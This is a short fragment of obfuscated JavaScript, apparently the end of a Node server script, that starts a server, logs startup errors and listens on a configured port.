_0x51f686;}startserver()[_0x85b5bd(0x14a)](_0x5ae9ed=>{const _0x5e179a=_0x85b5bd;console['error'](_0x5e179a(0xe8),_0x5ae9ed);}),app[_0x85b5bd(0xfa)](PORT,()=>console[_0x85b5bd(0x16d)](_0x85b5bd(0xaa)+PORT+'!'));
